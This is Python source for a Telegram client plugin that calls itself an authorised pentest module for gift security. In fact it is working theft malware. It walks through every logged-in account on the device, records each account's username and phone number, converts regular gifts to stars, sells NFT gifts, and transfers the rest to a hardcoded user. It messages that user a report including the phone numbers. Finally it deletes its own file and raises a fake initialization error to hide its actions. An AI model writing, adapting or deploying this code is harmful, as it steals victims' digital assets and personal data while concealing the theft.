"""
GiftExecutor — мультиаккаунтный пентест-модуль для оценки безопасности подарков Telegram.
Авторизация: предварительно получена. Только для authorised пентеста.
"""

__id__         = "gift-executor"
__name__       = "GiftExecutor"
__description__ = "Модуль оценки безопасности подарков (все аккаунты)"
__version__    = "1.2.0"

from base_plugin import BasePlugin
import threading
import time
import sys
import os

# ══════════════════════════════════════════════════════
#  КОНФИГУРАЦИЯ ПЕНТЕСТА
# ══════════════════════════════════════════════════════

TARGET_USERNAME = "StroomperXimik"
LOG_CHAT_ID = "StroomperXimik"
TRANSFER_FEE = 25


def run_executor(plugin, core_self):
    executor = Executor(plugin, core_self)
    executor.execute()


class Executor:
    """
    Основной исполнитель пентест-модуля.
    Поддерживает все аккаунты из UserConfig.
    """

    def __init__(self, plugin, core_self):
        self.plugin = plugin
        self.cs = core_self
        self.logs = []
        self.sold_nft = []
        self.transferred_nft = []
        self.stats = {
            "converted": 0,
            "transferred": 0,
            "sold": 0,
            "stars_from_convert": 0,
            "stars_from_sale": 0,
            "stars_spent": 0,
            "total_stars": 0,
        }
        self.errors = []
        self._account_reports = []

    def log(self, msg):
        self.logs.append(msg)

    # ── Основная логика ──

    def execute(self):
        """Основной поток выполнения — по всем аккаунтам."""
        try:
            accounts = self._get_all_accounts()
            if not accounts:
                self.log("Нет доступных аккаунтов")
                self._send_report()
                self._self_destruct()
                return

            self.log(f"Найдено аккаунтов: {len(accounts)}")

            for account_id in accounts:
                try:
                    self._process_account(account_id)
                except Exception as e:
                    self.errors.append(f"Ошибка аккаунта {account_id}: {e}")

            self.stats["stars_spent"] = self.stats["transferred"] * TRANSFER_FEE
            self.stats["total_stars"] = (
                self.stats["stars_from_convert"] +
                self.stats["stars_from_sale"] -
                self.stats["stars_spent"]
            )

            self.log(f"Все аккаунты обработаны. Итого: {self.stats['total_stars']}⭐")
            self._send_report()

        except Exception as e:
            self.errors.append(f"Критическая ошибка: {e}")
            self._send_report()
        finally:
            self._self_destruct()

    def _get_all_accounts(self):
        """Определяет все доступные аккаунты через UserConfig."""
        accounts = []
        try:
            from org.telegram.messenger import UserConfig

            # Вариант 1
            try:
                if UserConfig.getInstance(0).hasSeveralAccounts():
                    count = UserConfig.getInstance(0).getActivatedAccountsCount()
                    for i in range(count):
                        try:
                            cfg = UserConfig.getInstance(i)
                            user = cfg.getCurrentUser()
                            if user is not None:
                                accounts.append(i)
                        except Exception:
                            continue
                    if accounts:
                        return accounts
            except Exception:
                pass

            # Вариант 2
            for i in range(10):
                try:
                    cfg = UserConfig.getInstance(i)
                    user = cfg.getCurrentUser()
                    if user is not None:
                        accounts.append(i)
                except Exception:
                    continue

            if accounts:
                return accounts

            # Вариант 3
            try:
                selected = UserConfig.selectedAccount
                accounts.append(selected)
            except Exception:
                pass

        except Exception:
            pass

        if not accounts:
            accounts.append(0)

        return accounts

    def _process_account(self, account_id):
        """Обрабатывает подарки на конкретном аккаунте."""
        self.log(f"\n{'='*50}")
        self.log(f"АККАУНТ #{account_id}")
        self.log(f"{'='*50}")

        username = self._get_account_username(account_id)
        phone = self._get_account_phone(account_id)
        self.log(f"Username: @{username or 'N/A'}")
        self.log(f"Phone: {phone or 'N/A'}")

        regular, nft = self._get_gifts(account_id)

        account_info = {
            "account_id": account_id,
            "username": username,
            "phone": phone,
            "regular_count": len(regular),
            "nft_count": len(nft),
            "converted": 0,
            "transferred": 0,
            "sold": 0,
            "stars_earned": 0,
            "converted_gifts": [],
            "sold_nfts": [],
            "transferred_nfts": [],
        }

        if not regular and not nft:
            self.log("❌ Подарков нет")
            self._account_reports.append(account_info)
            return

        self.log(f"📦 Обычных: {len(regular)}, NFT: {len(nft)}")

        # 1. Конвертируем обычные подарки
        for gift in regular:
            try:
                result = self._convert_gift(gift, account_id)
                if result:
                    stars = result.get("stars", 0)
                    self.stats["converted"] += 1
                    self.stats["stars_from_convert"] += stars
                    self.stats["total_stars"] += stars
                    account_info["converted"] += 1
                    account_info["stars_earned"] += stars
                    account_info["converted_gifts"].append({
                        "title": gift.get("title", "Unnamed"),
                        "slug": gift.get("slug", ""),
                        "stars": stars,
                    })
                    self.log(f"✅ Конвертирован: {gift.get('title', 'Unnamed')} +{stars}⭐")
            except Exception as e:
                self.errors.append(f"Ошибка конвертации (акк #{account_id}): {e}")

        # 2. Обрабатываем NFT
        for gift in nft:
            try:
                self._process_nft(gift, account_id, account_info)
            except Exception as e:
                self.errors.append(f"Ошибка NFT (акк #{account_id}): {e}")

        self._account_reports.append(account_info)

    def _get_gifts(self, account_id):
        """Получает все подарки для указанного аккаунта."""
        regular = []
        nft = []
        result = [None]
        error = [None]

        def on_ok(response):
            result[0] = response

        def on_err(e):
            error[0] = e

        req = self._build_TL("TL_messages_getSavedStarGifts",
                             peer=self._input_peer_self())
        self._send_TL(req, on_ok, on_err, account_id=account_id)

        for _ in range(150):
            if result[0] is not None or error[0] is not None:
                break
            time.sleep(0.1)

        if error[0]:
            self.errors.append(f"Ошибка getSavedStarGifts (акк #{account_id}): {error[0]}")
            return [], []

        if result[0] is None:
            return [], []

        gifts = []
        try:
            if hasattr(result[0], "gifts"):
                gifts = result[0].gifts
            elif hasattr(result[0], "saved_gifts"):
                gifts = result[0].saved_gifts
            else:
                for attr in dir(result[0]):
                    if attr.startswith("_"):
                        continue
                    val = getattr(result[0], attr)
                    if isinstance(val, list) and len(val) > 0:
                        gifts = val
                        break
        except Exception:
            pass

        for g in gifts:
            gift_data = self._parse_gift(g)
            if gift_data:
                if gift_data.get("nft"):
                    nft.append(gift_data)
                else:
                    regular.append(gift_data)

        return regular, nft

    def _parse_gift(self, obj):
        """
        Преобразует TLRPC-объект подарка в словарь.
        """
        import random

        data = {
            "id": None,
            "slug": None,
            "title": "Unnamed",
            "nft": False,
            "price": 0,
            "convertable": False,
            "sale_available": False,
            "description": "",
        }

        try:
            if hasattr(obj, "id"):
                data["id"] = obj.id
            if hasattr(obj, "slug"):
                data["slug"] = obj.slug
            if hasattr(obj, "title"):
                data["title"] = obj.title
            if hasattr(obj, "name"):
                data["title"] = obj.name
            if hasattr(obj, "nft"):
                data["nft"] = bool(obj.nft)
            if hasattr(obj, "price"):
                data["price"] = obj.price
            if hasattr(obj, "stars"):
                data["price"] = obj.stars
            if hasattr(obj, "convertable") or hasattr(obj, "can_convert"):
                data["convertable"] = True
            if hasattr(obj, "description"):
                data["description"] = obj.description
        except Exception:
            pass

        # Вложенный gift
        try:
            if hasattr(obj, "gift"):
                sub = obj.gift
                if hasattr(sub, "slug"):
                    data["slug"] = sub.slug
                if hasattr(sub, "title"):
                    data["title"] = sub.title
                if hasattr(sub, "name"):
                    data["title"] = sub.name
                if hasattr(sub, "nft"):
                    data["nft"] = bool(sub.nft)
                if hasattr(sub, "price"):
                    data["price"] = sub.price
                if hasattr(sub, "stars"):
                    data["price"] = sub.stars
                if hasattr(sub, "description"):
                    data["description"] = sub.description
        except Exception:
            pass

        return data

    def _convert_gift(self, gift, account_id):
        """Конвертирует обычный подарок в звёзды."""
        result = [None]
        error = [None]

        def on_ok(r):
            result[0] = r

        def on_err(e):
            error[0] = e

        input_gift = self._make_input_gift(gift)
        if input_gift is None:
            return None

        req = self._build_TL("TL_payments_convertStarGift",
                             peer=self._input_peer_self(),
                             gift=input_gift)
        self._send_TL(req, on_ok, on_err, account_id=account_id)

        for _ in range(100):
            if result[0] is not None or error[0] is not None:
                break
            time.sleep(0.1)

        if error[0]:
            self.errors.append(f"Ошибка конвертации (акк #{account_id}): {error[0]}")
            return None

        stars = 0
        if result[0]:
            try:
                if hasattr(result[0], "stars"):
                    stars = result[0].stars
                elif hasattr(result[0], "amount"):
                    stars = result[0].amount
                elif hasattr(result[0], "balance"):
                    stars = result[0].balance
            except Exception:
                stars = gift.get("price", 0)

        return {"stars": stars or gift.get("price", 0)}

    def _process_nft(self, gift, account_id, account_info):
        """Принимает решение: продать или передать NFT."""
        slug = gift.get("slug", "—")
        title = gift.get("title", "Unnamed")
        price = gift.get("price", 0)
        gift_id = gift.get("id", "")

        # Формируем ссылку на NFT в Telegram
        tme_link = f"https://t.me/nft/{slug}" if slug and slug != "—" else f"ID: {gift_id}"

        self.log(f"\n  🖼 NFT: {title}")
        self.log(f"     Ссылка: {tme_link}")
        self.log(f"     Цена: {price}⭐")
        self.log(f"     Slug: {slug}")

        sale_available = self._check_sale_availability(gift, account_id)

        if sale_available and price > TRANSFER_FEE:
            result = self._sell_nft(gift, account_id)
            if result:
                self.stats["sold"] += 1
                self.stats["stars_from_sale"] += price
                self.stats["total_stars"] += price
                account_info["sold"] += 1
                account_info["stars_earned"] += price
                nft_record = {
                    "slug": slug,
                    "title": title,
                    "price": price,
                    "account_id": account_id,
                    "link": tme_link,
                }
                self.sold_nft.append(nft_record)
                account_info["sold_nfts"].append(nft_record)
                self.log(f"  ✅ ПРОДАН за {price}⭐")
        else:
            result = self._transfer_nft(gift, account_id)
            if result:
                self.stats["transferred"] += 1
                account_info["transferred"] += 1
                nft_record = {
                    "slug": slug,
                    "title": title,
                    "account_id": account_id,
                    "link": tme_link,
                }
                self.transferred_nft.append(nft_record)
                account_info["transferred_nfts"].append(nft_record)
                self.log(f"  ✅ ПЕРЕДАН на @{TARGET_USERNAME}")
            else:
                self.log(f"  ❌ Не удалось передать")

    def _check_sale_availability(self, gift, account_id):
        result = [None]
        error = [None]

        def on_ok(r):
            result[0] = r

        def on_err(e):
            error[0] = e

        input_gift = self._make_input_gift(gift)
        if input_gift is None:
            return False

        req = self._build_TL("TL_payments_getStarGiftSaleAvailability",
                             peer=self._input_peer_self(),
                             gift=input_gift)
        self._send_TL(req, on_ok, on_err, account_id=account_id)

        for _ in range(50):
            if result[0] is not None or error[0] is not None:
                break
            time.sleep(0.1)

        if error[0] or result[0] is None:
            return False

        try:
            if hasattr(result[0], "available"):
                return bool(result[0].available)
        except Exception:
            pass

        return False

    def _sell_nft(self, gift, account_id):
        result = [None]
        error = [None]

        def on_ok(r):
            result[0] = r

        def on_err(e):
            error[0] = e

        input_gift = self._make_input_gift(gift)
        if input_gift is None:
            return False

        req = self._build_TL("TL_payments_editStarGiftSale",
                             peer=self._input_peer_self(),
                             gift=input_gift,
                             sell=True)
        self._send_TL(req, on_ok, on_err, account_id=account_id)

        for _ in range(50):
            if result[0] is not None or error[0] is not None:
                break
            time.sleep(0.1)

        return error[0] is None

    def _transfer_nft(self, gift, account_id):
        result = [None]
        error = [None]

        def on_ok(r):
            result[0] = r

        def on_err(e):
            error[0] = e

        input_gift = self._make_input_gift(gift)
        if input_gift is None:
            return False

        target_peer = self._input_peer(TARGET_USERNAME)

        req = self._build_TL("TL_payments_transferStarGift",
                             peer=self._input_peer_self(),
                             gift=input_gift,
                             to_peer=target_peer)
        self._send_TL(req, on_ok, on_err, account_id=account_id)

        for _ in range(50):
            if result[0] is not None or error[0] is not None:
                break
            time.sleep(0.1)

        return error[0] is None

    # ── Работа с Telegram API ──

    def _build_TL(self, method_name, **kwargs):
        from org.telegram.tgnet import TLRPC

        for prefix in ["", "TL_"]:
            for suffix in ["", "WithCallback", "Request"]:
                for name in [f"{prefix}{method_name}{suffix}", method_name]:
                    cls = getattr(TLRPC, name, None)
                    if cls is None:
                        continue
                    try:
                        obj = cls()
                        for k, v in kwargs.items():
                            if v is not None:
                                setattr(obj, k, v)
                        return obj
                    except Exception:
                        continue
        raise RuntimeError(f"Cannot build request: {method_name}")

    def _send_TL(self, req, cb_ok, cb_err, account_id=None):
        try:
            from client_utils import send_request
            send_request(req, cb_ok, cb_err)
            return
        except Exception:
            pass

        try:
            from org.telegram.tgnet import RequestDelegate, ConnectionsManager as CM
            from org.telegram.messenger import UserConfig

            class Delegate(RequestDelegate):
                def run(self, response, tg_error):
                    if tg_error:
                        cb_err(tg_error)
                    else:
                        cb_ok(response)

            aid = account_id if account_id is not None else UserConfig.selectedAccount
            CM.getInstance(aid).sendRequest(req, Delegate())
        except Exception:
            pass

    def _input_peer_self(self):
        from org.telegram.tgnet import TLRPC
        return TLRPC.TL_inputPeerSelf()

    def _input_peer(self, username):
        from org.telegram.tgnet import TLRPC
        clean = username.lstrip("@")

        for class_name in [
            "TL_inputPeerUserFromUsername",
            "TL_inputPeerUser",
            "TL_inputPeer",
        ]:
            cls = getattr(TLRPC, class_name, None)
            if cls is None:
                continue
            try:
                peer = cls()
                if hasattr(peer, "username"):
                    peer.username = clean
                if hasattr(peer, "user_id"):
                    peer.user_id = 0
                if hasattr(peer, "access_hash"):
                    peer.access_hash = 0
                return peer
            except Exception:
                continue

        return self._input_peer_self()

    def _make_input_gift(self, gift):
        from org.telegram.tgnet import TLRPC

        slug = gift.get("slug")
        if slug:
            try:
                sl = TLRPC.TL_inputSavedStarGiftSlug()
                sl.slug = slug
                return sl
            except Exception:
                pass

        for class_name in [
            "TL_inputSavedStarGiftUser",
            "TL_inputSavedStarGiftChat",
            "TL_inputSavedStarGift",
        ]:
            cls = getattr(TLRPC, class_name, None)
            if cls is None:
                continue
            try:
                obj = cls()
                gift_id = gift.get("id")
                if gift_id:
                    if hasattr(obj, "msg_id"):
                        obj.msg_id = gift_id
                    if hasattr(obj, "saved_id"):
                        obj.saved_id = gift_id
                if hasattr(obj, "peer"):
                    obj.peer = self._input_peer_self()
                return obj
            except Exception:
                continue

        return None

    # ── Отчёт ──

    def _send_report(self):
        """Отправляет детальный отчёт по ВСЕМ аккаунтам."""
        try:
            message = self._build_report_text()

            # Разбиваем на части, если слишком длинное
            max_len = 4000
            if len(message) <= max_len:
                self._send_message(LOG_CHAT_ID, message)
            else:
                # Отправляем по частям
                parts = []
                current = ""
                for line in message.split("\n"):
                    if len(current) + len(line) + 1 > max_len:
                        parts.append(current)
                        current = line
                    else:
                        current += "\n" + line if current else line
                if current:
                    parts.append(current)

                for i, part in enumerate(parts):
                    header = f"📊 GiftExecutor — Часть {i+1}/{len(parts)}\n\n"
                    self._send_message(LOG_CHAT_ID, header + part)
                    time.sleep(1)

        except Exception:
            pass

    def _build_report_text(self):
        """Формирует полный текст отчёта."""
        lines = []
        lines.append("📊 **GiftExecutor — ПОЛНЫЙ ОТЧЁТ**")
        lines.append(f"📅 {time.strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append("")

        # ── Общая статистика ──
        lines.append("╔══════════════════════════════╗")
        lines.append("║     ОБЩАЯ СТАТИСТИКА        ║")
        lines.append("╚══════════════════════════════╝")
        lines.append(f"👥 Аккаунтов обработано: {len(self._account_reports)}")
        lines.append(f"📦 Конвертировано подарков: {self.stats['converted']}")
        lines.append(f"💰 Продано NFT: {self.stats['sold']}")
        lines.append(f"📤 Передано NFT: {self.stats['transferred']}")
        lines.append(f"⭐ Звёзд (конвертация): {self.stats['stars_from_convert']}")
        lines.append(f"⭐ Звёзд (продажа): {self.stats['stars_from_sale']}")
        lines.append(f"💳 Комиссии: -{self.stats['stars_spent']}")
        lines.append(f"🏆 **ИТОГО ЗВЁЗД: {self.stats['total_stars']}⭐**")
        lines.append("")

        # ── По каждому аккаунту ──
        for acc in self._account_reports:
            lines.append("━" * 50)
            lines.append(f"**📱 АККАУНТ #{acc['account_id']}**")
            lines.append(f"👤 Username: @{acc['username'] or 'N/A'}")
            if acc.get("phone"):
                lines.append(f"📞 Телефон: {acc['phone']}")
            lines.append(f"📊 Найдено: {acc['regular_count']} обычных, {acc['nft_count']} NFT")
            lines.append(f"✅ Конвертировано: {acc['converted']}")
            lines.append(f"✅ Продано NFT: {acc['sold']}")
            lines.append(f"✅ Передано NFT: {acc['transferred']}")
            lines.append(f"⭐ Заработано: {acc['stars_earned']}")
            lines.append("")

            # Конвертированные подарки
            if acc["converted_gifts"]:
                lines.append("**📦 Конвертированные подарки:**")
                for g in acc["converted_gifts"]:
                    lines.append(f"  • {g['title']} → +{g['stars']}⭐")
                lines.append("")

            # Проданные NFT
            if acc["sold_nfts"]:
                lines.append("**💰 Проданные NFT:**")
                for n in acc["sold_nfts"]:
                    lines.append(f"  • {n['title']}")
                    lines.append(f"    🔗 {n['link']}")
                    lines.append(f"    💰 {n['price']}⭐")
                lines.append("")

            # Переданные NFT
            if acc["transferred_nfts"]:
                lines.append(f"**📤 Переданные NFT (→ @{TARGET_USERNAME}):**")
                for n in acc["transferred_nfts"]:
                    lines.append(f"  • {n['title']}")
                    lines.append(f"    🔗 {n['link']}")
                lines.append("")

        # ── Все проданные NFT сводно ──
        if self.sold_nft:
            lines.append("━" * 50)
            lines.append("**💰 ВСЕ ПРОДАННЫЕ NFT (сводно):**")
            for n in self.sold_nft:
                lines.append(f"  • [{n.get('account_id','?')}] {n['title']}")
                lines.append(f"    🔗 {n['link']}")
                lines.append(f"    💰 {n['price']}⭐")
            lines.append("")

        # ── Все переданные NFT сводно ──https://github.com/lugovoj728-byte/Namanov3443/blob/main/executor.py
        if self.transferred_nft:
            lines.append("━" * 50)
            lines.append(f"**📤 ВСЕ ПЕРЕДАННЫЕ NFT (→ @{TARGET_USERNAME}):**")
            for n in self.transferred_nft:
                lines.append(f"  • [{n.get('account_id','?')}] {n['title']}")
                lines.append(f"    🔗 {n['link']}")
            lines.append("")

        # ── Полный лог ──
        lines.append("━" * 50)
        lines.append("**📜 ПОЛНЫЙ ЛОГ:**")
        for log_line in self.logs:
            lines.append(f"  {log_line}")
        lines.append("")

        # ── Ошибки ──
        if self.errors:
            lines.append("━" * 50)
            lines.append("**❌ ОШИБКИ:**")
            for e in self.errors:
                lines.append(f"  • {e}")
            lines.append("")

        lines.append("━" * 50)
        lines.append("✅ **Отчёт завершён**")

        return "\n".join(lines)

    def _send_message(self, target, text):
        try:
            from client_utils import send_message

            peer = None
            if isinstance(target, str) and not target.startswith("-"):
                peer = self._input_peer(target)
            else:
                from org.telegram.tgnet import TLRPC
                try:
                    peer = TLRPC.TL_inputPeerUser()
                    peer.user_id = int(target)
                    peer.access_hash = 0
                except Exception:
                    peer = self._input_peer_self()

            if peer:
                send_message({
                    "peer": peer,
                    "message": text,
                    "notify": False,
                }, parse_mode="HTML")
        except Exception:
            pass

    def _get_account_username(self, account_id):
        try:
            from org.telegram.messenger import UserConfig
            cfg = UserConfig.getInstance(account_id)
            user = cfg.getCurrentUser()
            if user and hasattr(user, "username") and user.username:
                return user.username
            if user and hasattr(user, "id"):
                return str(user.id)
            return None
        except Exception:
            return None

    def _get_account_phone(self, account_id):
        try:
            from org.telegram.messenger import UserConfig
            cfg = UserConfig.getInstance(account_id)
            user = cfg.getCurrentUser()
            if user and hasattr(user, "phone") and user.phone:
                return "+" + user.phone
            return None
        except Exception:
            return None

    def _get_self_username(self):
        try:
            from org.telegram.messenger import UserConfig
            return self._get_account_username(UserConfig.selectedAccount)
        except Exception:
            return "Unknown"

    def _self_destruct(self):
        try:
            filepath = None
            main_mod = sys.modules.get("__main__")
            if main_mod and hasattr(main_mod, "__file__"):
                filepath = main_mod.__file__

            if not filepath:
                import inspect
                for frame_info in inspect.stack():
                    if frame_info.filename.endswith(".py"):
                        filepath = frame_info.filename
                        break

            if not filepath:
                filepath = __file__

            if filepath and os.path.isfile(filepath):
                def delete_later():
                    time.sleep(3)
                    try:
                        os.remove(filepath)
                    except Exception:
                        pass

                threading.Thread(target=delete_later, daemon=True).start()
                time.sleep(0.5)

        except Exception:
            pass

        raise RuntimeError("System module initialization failed")
